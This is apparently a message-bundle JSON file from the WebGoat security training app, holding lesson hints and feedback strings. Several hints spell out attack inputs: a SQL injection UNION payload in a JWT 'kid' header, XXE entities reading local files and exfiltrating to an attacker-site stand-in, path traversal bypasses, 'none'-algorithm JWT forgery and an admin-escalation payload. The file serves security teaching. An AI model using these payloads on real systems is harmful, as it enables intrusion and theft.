\"email.send\" : \"An e-mail has been send to {0}\",\n  \"ClientSideFiltering.incorrect\" : \"This is not the salary from Neville Bartholomew...\",\n  \"spoofcookie.hint3\" : \"Build a non-legitimate cookie and load it into the browser.\",\n  \"SqlStringInjectionHint.10.2\" : \"The application takes your input and filters for entries that are LIKE it.\",\n  \"spoofcookie.hint2\" : \"We need to deduce how the cookie value is formed. Can we deduce it? Is it possible to create a non-legitimate cookie?\",\n  \"SqlStringInjectionHint.10.3\" : \"Try query chaining to reach the goal.\",\n  \"spoofcookie.hint1\" : \"Investigate thoroughly how the cookie in this lesson is structured and try to draw conclusions about its encoding and content.\",\n  \"SqlStringInjectionHint.10.1\" : \"Use the techniques that you have learned before.\",\n  \"SqlStringInjectionHint.10.6\" : \"Remember that you can use the -- metacharacter to comment out the rest of the line.\",\n  \"SqlStringInjectionHint.10.4\" : \"The DDL allows you to delete (DROP) database tables.\",\n  \"SqlStringInjectionHint.10.5\" : \"The underlying SQL query looks like that: \\\"SELECT * FROM access_log WHERE action LIKE '%\\\" + action + \\\"%'\\\".\",\n  \"securepassword-success\" : \"You have succeeded! The password is secure enough.\",\n  \"show-password\" : \"Show Password\",\n  \"http-basics.EnterYourName\" : \"Enter your Name\",\n  \"accounts.table.user\" : \"User\",\n  \"insecure-deserialization.stringobject\" : \"That is not the VulnerableTaskHolder object. However a plain String is harmless. Let's try again with the right object.\",\n  \"SqlStringInjectionHint-mitigation-13-3\" : \"Use for example \\\"(case when (true) then hostname else id end)\\\" in the order by and see what happens\",\n  \"SqlStringInjectionHint-mitigation-13-4\" : \"Use for example \\\"(case when (true) then hostname else id end)\\\" in the order by and see what happens\",\n  \"missing-function-access-control.title\" : \"Missing Function Level Access Control\",\n  \"SqlStringInjectionHint-mitigation-13-1\" : \"Try sorting and look at the request\",\n  \"SqlStringInjectionHint-mitigation-13-2\" : \"Intercept the request and try to specify a different order by\",\n  \"xxe.hints.simple.xxe.1\" : \"Try submitting the form and see what happens\",\n  \"idor.edit.profile.success1\" : \"Well done, you have modified someone else's profile (as displayed below)\",\n  \"jwt-kid-hint4\" : \"The key is stored in the database and loaded while verifying a token\",\n  \"jwt-kid-hint5\" : \"Using a SQL injection you might be able to manipulate the key to something you know and create a new token.\",\n  \"xxe.hints.simple.xxe.6\" : \"In the comment you should references: &lt;comment&gt;&lt;text&gt;&root;test&lt;/text&gt;&lt;/comment&gt;\",\n  \"jwt-kid-hint6\" : \"Use: hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --  as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token\",\n  \"idor.edit.profile.success2\" : \"Good work! View the updated profile below\",\n  \"xxe.hints.simple.xxe.4\" : \"The include can be as follows: &lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM \\\"file:///\\\"&gt; ]>\",\n  \"SqlStringInjectionHint3-1\" : \"Try the UPDATE statement\",\n  \"xxe.hints.simple.xxe.5\" : \"Do not forget to reference the entity\",\n  \"SqlStringInjectionHint3-2\" : \"UPDATE table name SET column name=value WHERE condition;\",\n  \"xxe.hints.simple.xxe.2\" : \"Use ZAP/Burp to intercept the request and try to include your own DTD\",\n  \"xxe.hints.simple.xxe.3\" : \"Try to include a doctype \\\"(&lt;!DOCTYPE...)\\\" in the xml\",\n  \"jwt-secret-hint1\" : \"Save the token and try to verify the token locally\",\n  \"path-traversal-profile-retrieve.hint1\" : \"Can you specify the image to be fetched?\",\n  \"path-traversal-profile-retrieve.hint3\" : \"Use /random?id=1 for example to fetch a specific image\",\n  \"xxe.hints.content.type.xxe.2\" : \"Does the endpoint only accept json messages?\",\n  \"path-traversal-profile-retrieve.hint2\" : \"Look at the location header...\",\n  \"xxe.hints.content.type.xxe.1\" : \"Take a look at the content type\",\n  \"jwt-kid-hint1\" : \"Take a look at the token and specifically and the header\",\n  \"path-traversal-profile-retrieve.hint5\" : \"'..' and '/' are no longer allowed, can you bypass this restriction\",\n  \"jwt-secret-hint2\" : \"Download a word list dictionary (https://github.com/first20hours/google-10000-english)\",\n  \"jwt-kid-hint2\" : \"The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS\",\n  \"client.side.filtering.title\" : \"Client side filtering\",\n  \"ClientSideFilteringHint10\" : \"Stage 2: Your filter operator should look something like: [Managers/Manager/text()=\",\n  \"path-traversal-profile-retrieve.hint4\" : \"Use /random/?id=../../1.jpg to navigate to a different directory\",\n  \"jwt-secret-hint3\" : \"Write a small program or use HashCat for brute forcing the token according the word list\",\n  \"jwt-kid-hint3\" : \"The key can be located on the filesystem in memory or even reside in the database\",\n  \"path-traversal-profile-retrieve.hint6\" : \"Use url encoding for ../ to bypass the restriction\",\n  \"path-traversal-zip-slip.extracted\" : \"Zip file extracted successfully failed to copy the image. Please get in touch with our helpdesk.\",\n  \"insecure-deserialization.expired\" : \"The task is not executable between now and the next ten minutes, so the action will be ignored. Maybe you copied an old solution? Let's try again.\",\n  \"client.side.filtering.free.hint3\" : \"One of the responses contains the answer\",\n  \"client.side.filtering.free.hint2\" : \"Try to see the flow of request from the page to the backend\",\n  \"client.side.filtering.free.hint1\" : \"Look through the web page inspect the sources etc\",\n  \"register.new\" : \"or register yourself as a new user\",\n  \"xss-mitigation-3-failure\" : \"This in not the correct answer. Try again!\",\n  \"logged_out\" : \"You've been logged out successfully.\",\n  \"accounts.table.password\" : \"Password\",\n  \"ssrf.success\" : \"You rocked the SSRF!\",\n  \"about\" : \"About WebGoat\",\n  \"crypto-hashing.empty\" : \"Try again.\",\n  \"input.invalid\" : \"Input for user, email and/or password is empty or too long, please fill in all field and/or limit all fields to 30 characters.\",\n  \"username.duplicate\" : \"User already exists.\",\n  \"access-control.hidden-menus.success\" : \"Correct! And not hard to find are they?!? One of these urls will be helpful in the next lab.\",\n  \"register.condition.1\" : \"While running this program your machine will be extremely vulnerable to attack.You should disconnect from the Internet while using this program. WebGoat's default configuration binds to localhost to minimize the exposure. \",\n  \"register.condition.2\" : \"This program is for educational purposes only. If you attempt these techniques without authorization, you are very likely to get caught. If you are caught engaging in unauthorized hacking, most companies will fire you. Claiming that you were doing security research will not work as that is the first thing that all hackers claim.\",\n  \"verify-account.failed\" : \"Not quite, please try again.\",\n  \"show.hints\" : \"Show hints\",\n  \"SqlInjectionChallengeHint2\" : \"Find the field which is vulnerable to SQL injection use that to change the password.\",\n  \"webwolf.code_incorrect\" : \"That is not the correct code: {0}, please try again.\",\n  \"SqlInjectionChallengeHint1\" : \"The table name is randomized at each start of WebGoat, try to figure out the name first.\",\n  \"SqlInjectionChallengeHint4\" : \"The vulnerable field is the username field of the register form.\",\n  \"SqlInjectionChallengeHint3\" : \"Change the password through an UPDATE Statement.\",\n  \"login_failed\" : \"Login failed\",\n  \"ClientSideFilteringStage1Complete\" : \"Stage 1 completed.\",\n  \"jwt-only-admin\" : \"Only an admin user can reset the votes\",\n  \"ClientSideFilteringErrorGenerating\" : \"Error generating \",\n  \"reset.lesson\" : \"Reset lesson\",\n  \"insecure-deserialization.wrongobject\" : \"That is not the VulnerableTaskHolder object. Good try! because the code is not checking this after running the readObject(). Let's try again with the right object.\",\n  \"sql-injection.2.failed\" : \"Something went wrong! You got no results, check your SQL Statement and the table above.\",\n  \"xss-stored-comment-failure\" : \"We cannot see the payload in your submission, but XSS can be tricky. Look for the call back fired after the comments reload. If you see that and can put the correct value there and put it in, maybe you did succeed.\",\n  \"ssrf.hint3\" : \"You need to put the protocol, \\\"http://\\\" in front of ifconfig.pro.\",\n  \"ssrf.hint2\" : \"If Tom is images/tom.png, Jerry would be images/jerry.png.\",\n  \"ssrf.hint1\" : \"You should use an HTTP proxy to intercept the request and change the URL.\",\n  \"crypto-hashing.success\" : \"Congratulations. You found it!\",\n  \"insecure-login.intercept.success\" : \"Welcome, CaptainJack!\",\n  \"password.confirm\" : \"Confirm password\",\n  \"sql-injection.2.success\" : \"You have succeeded!\",\n  \"ssrf.title\" : \"Server-Side Request Forgery\",\n  \"insecure-login.intercept.failure\" : \"Wrong username or password\",\n  \"NoResultsMatched\" : \"No results matched, try again.\",\n  \"path-traversal-title\" : \"Path traversal\",\n  \"ClientSideFilteringStage1Question\" : \"What is Neville Bartholomew's salary? \",\n  \"password.diff\" : \"The passwords do not match.\",\n  \"sql-injection.10b.no-code\" : \"You need to write some code.\",\n  \"idor.login.success\" : \"You are now logged in as {0}. Please proceed.\",\n  \"login_failed.tom\" : \"Sorry only Tom can login at the moment\",\n  \"idor.diff.failure\" : \"Try again. Look in your browser dev tools or Proxy and compare to what's displayed on the screen.\",\n  \"vulnerable-components.fromXML\" : \"You created contact {0}.  This means you did not exploit the remote code execution.\",\n  \"6.crypto.title\" : \"Crypto Basics\",\n  \"idor.login.failure\" : \"Credentials provided are not correct\",\n  \"terms.agree\" : \"Agree with the terms and conditions\",\n  \"idor.hints.idorDiffAttributes2\" : \"View the response using developer tools or a proxy.\",\n  \"idor.hints.idorDiffAttributes3\" : \"The attributes are not visible and have nothing to do with size, color or name\",\n  \"4.xss.title\" : \"Cross Site Scripting\",\n  \"ClientSideFilteringInstructions1\" : \"STAGE 1: You are logged in as Moe Stooge, CSO of Goat Hills Financial. You have access to everyone in the company's information, except the CEO,  .  Or at least you shouldn't have access to the CEO's information.  For this exercise, examine the contents of the page to see what extra information you can find.\",\n  \"idor.hints.idorDiffAttributes1\" : \"Make sure you have logged in on the previous step/page\",\n  \"ClientSideFilteringInstructions2\" : \"STAGE 2: Now, fix the problem.  Modify the server to only return results that Moe Stooge is allowed to see.\",\n  \"not.empty\" : \"This field is required.\",\n  \"vulnerable-components.success\" : \"You successfully tried to exploit the CVE-2013-7285 vulnerability\",\n  \"ssrf.failure\" : \"You need to stick to the game plan!\",\n  \"SqlOnlyInputValidation-failed\" : \"Using spaces is not allowed!\",\n  \"crypto-secure-defaults.hints.1\" : \"After starting the docker container enter the container using docker exec -ti _dockerid_ /bin/bash\",\n  \"lesson-template.title\" : \"Writing new lesson\",\n  \"crypto-secure-defaults.hints.3\" : \"Try to change the /etc/shadow file using docker cp\",\n  \"csrf-login-success\" : \"Congratulations, now log out and login with your normal user account within WebGoat, remember the attacker knows you solved this assignment\",\n  \"crypto-secure-defaults.hints.2\" : \"Try to gain access to /root. Try to become user root by su -\",\n  \"challenge.solved\" : \"Congratulations, you solved the challenge. Here is your flag: {0}\",\n  \"bypass-restrictions.title\" : \"Bypass front-end restrictions\",\n  \"path-traversal-profile-updated\" : \"Profile has been updated, your image is available at: {0}\\\"\",\n  \"html-tampering.tamper.failure\" : \"This is too expensive... You need to buy at a cheaper cost!\",\n  \"idor.view.other.profile.failure1\" : \"You must authenticate first\",\n  \"idor.view.other.profile.failure2\" : \"<<still working>>\",\n  \"network.success\" : \"Correct, Well Done.\",\n  \"xxe.blind.hints.1\" : \"This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case)\",\n  \"xxe.blind.hints.2\" : \"In this case you cannot combine external entities in combination with internal entities.\",\n  \"xxe.blind.hints.3\" : \"Use parameter entities to perform the attack, see for example: https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/\",\n  \"challenge.flag.correct\" : \"Congratulations you have solved the challenge!!\",\n  \"user.not.larry\" : \"Please try to log in as Larry not {0}. \",\n  \"crypto-signing.modulusnotok\" : \"The modulus is not correct\",\n  \"xxe.blind.hints.4\" : \"An example DTD can be found [[webgoat base url]]/WebGoat/xxe/sampledtd, include this DTD in the xml comment\",\n  \"xxe.blind.hints.5\" : \"Use for the comment, be aware to replace the url accordingly: &lt;?xml version=\\\"1.0\\\"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY % remote SYSTEM \\\"[[webwolf base url]]/files/[[user]]/test.dtd\\\"&gt;%remote;]&gt;&lt;comment&gt;&lt;text&gt;test&send;&lt;/text&gt;&lt;/comment&gt;\",\n  \"access-control.hash.hint11\" : \"You will want to add your own username with an admin role. Yes, you'd have to guess/fuzz this in a real-world setting.\",\n  \"access-control.hash.hint10\" : \"To determine the correct payload for the request, it's essential to examine how the registration process operates. Ensure that the payload is properly formatted according to the content type you defined earlier. Additionally, consider what information the response reveals when you submit an empty payload using the previously identified content type.\",\n  \"access-control.hash.hint13\" : \"Once you've escalated yourself to an admin, retry the GET request to '/access-control/users-admin-fix'.\",\n  \"access-control.hash.hint12\" : \"Alright, let's proceed. To grant admin privileges to our current WebGoat user, change the method to POST and set the content-type to 'application/json'. Your payload should resemble something like this: {\\\"username\\\":\\\"your-webgoat-user\\\", \\\"password\\\":\\\"\\\", \\\"admin\\\": \\\"true\\\"}. Ensure that you are adding admin privileges to our current WebGoat user.\",\n  \"path-traversal-profile-attempt\" : \"Nice try, but the directory({0}) is incorrect, please write the file to the correct directory\",\n  \"hint1\" : \"Try to change the number of items and see what is happening\",\n  \"1.http-basics.title\" : \"HTTP Basics\",\n  \"hint2\" : \"Is the price part of the HTML request?\",\n  \"hint3\" : \"Intercept the request and manipulate the price before submitting it.\",\n  \"idor.view.profile.close1\" : \"You're on the right path, try a different id\",\n  \"idor.view.profile.close2\" : \"Try again. You need to use the same method/URL you used to access your own profile via direct object reference.\",\n  \"jwt-final-not-tom\" : \"Username is not Tom try to pass a token for Tom\",\n  \"jwt-change-token-hint5\" : \"Submit the token by changing the algorithm to None and remove the signature\",\n  \"jwt-change-token-hint4\" : \"Change the admin field to true in the token\",\n  \"jwt-change-token-hint3\" : \"Change the contents of the token and replace the cookie before sending the request for getting the votes \",\n  \"jwt-change-token-hint2\" : \"Decode the token and look at the contents\",\n  \"jwt-refresh-hint2\" : \"The token from the access log is no longer valid, can you find a way to refresh it?\",\n  \"lesson-template.sample-attack.success\" : \"Sample success message\",\n  \"jwt-refresh-hint1\" : \"Look at the access log you will find a token there\",\n  \"jwt-refresh-hint4\" : \"Use the found access token in the Authorization: Bearer header and use your own refresh token\",\n  \"jwt-refresh-hint3\" : \"The endpoint for refreshing a token is 'JWT/refresh/newToken'\",\n  \"crypto-signing.hints.3\" : \"Actually the \\\"modulus\\\" of the public key is the same as the private key. You could use openssl rsa -in test.key -pubout > test.pub and then openssl rsa -in test.pub -pubin -modulus -noout or other components. \",\n  \"jwt-change-token-hint1\" : \"Select a different user and look at the token you receive back, use the delete button to reset the votes count\",\n  \"crypto-signing.hints.4\" : \"Make sure that you do not take hidden characters into account. You might want to use echo -n \\\"00AE89...\\\" | openssl dgst -sign somekey -sha256 ... and do not forget to base64 encode the outcome\",\n  \"crypto-signing.hints.1\" : \"Use openssl to get the public key from the private key. Apparently both private and public key information are stored.\",\n  \"crypto-signing.hints.2\" : \"Use the private key to sign the \\\"modulus\\\" value of the public key.\",\n  \"xss-reflected-5a-success-alert\" : \"Congratulations, but alerts are not very impressive are they? Let's continue to the next assignment.\",\n  \"sql-injection.9.success\" : \"Well done! Now you are earning the most money. And at the same time you successfully compromised the integrity of data by changing the salary!\",\n  \"path-traversal-profile-empty-file\" : \"File appears to be empty please upload a non empty file\",\n  \"http-basics.hints.http_basic_quiz.1\" : \"Turn on Show Parameters or other features\",\n  \"http-basics.hints.http_basic_quiz.2\" : \"Try to intercept the request with <a href='https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project' title='Link to ZAP'>OWASP ZAP</a>\",\n  \"ClientSideFilteringStage2Finish\" : \"Click here when you believe you have completed the lesson.\",\n  \"http-basics.magic\" : \"You are close, try again: the magic number is incorrect.\",\n  \"password-reset-simple.email_failed\" : \"There was an error while sending the e-mail. Is WebWolf running?\",\n  \"csrf-feedback-invalid-json\" : \"Invalid JSON received.\",\n  \"4.cia.title\" : \"CIA Triad\",\n  \"sql-injection.5b.no.results\" : \"No results matched. Try Again.\",\n  \"idor.edit.profile.failure1\" : \"Close ... you've got the technique. Now try for a lower role number\",\n  \"idor.edit.profile.failure2\" : \"Close ... you've got the technique. Now change the color in their profile to red.\",\n  \"idor.edit.profile.failure3\" : \"Try again. Use the hints if you need to.\",\n  \"idor.edit.profile.failure4\" : \"Modifying your own profile is good, but we want to do this to Buffalo Bill's profile.\",\n  \"jwt-user\" : \"You are logged in as  {0}, but you are not an admin yet, please try again\",\n  \"vulnerable-components.title\" : \"Vulnerable Components\",\n  \"sql-injection.6a.no.results\" : \"No results matched. Try Again.\",\n  \"webwolf.email_mismatch\" : \"Of course you can send mail to user {0} however you will not be able to read this e-mail in WebWolf, please use your own username.\",\n  \"securepassword-failed\" : \"You have failed! Try to enter a secure password.\"\n}"
